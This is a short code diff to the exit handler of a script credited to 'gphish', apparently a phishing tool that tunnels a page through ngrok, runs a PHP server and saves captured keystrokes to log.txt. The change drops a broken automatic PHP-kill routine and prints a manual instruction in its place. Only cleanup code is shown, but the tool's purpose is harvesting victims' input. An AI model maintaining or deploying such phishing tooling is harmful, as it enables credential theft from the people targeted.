@@ -1,7 +1,7 @@
 # Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/gphish)
 
 import warnings
-import os, time, subprocess
+import os, time
 from sys import platform, exit
 import pyfiglet as figlet
 from pyngrok import ngrok
@@ -66,22 +66,8 @@ try:
     program()
 except KeyboardInterrupt:
   ngrok.kill()
-  if platform == "win32":
-    try:
-      os.system("taskkill /im php.exe")
-    except:
-      print("Error Killing PHP process please kill the process manually")
-  else:
-    name = "php"
-    try:
-      os.popen("ps ax | grep " + name + " | grep -v grep")
-      fields = line.split()     
-      pid = fields[0]
-      os.kill(int(pid), signal.SIGKILL)
-    except:
-      print("Error Killing PHP process please kill the process manually")
-  
   os.system(clear)
+  print("Please kill php process, if you want to run the script again or it won't work...")
   print("Keylog save as : log.txt")
   print("\nExitting...")
   exit(0)
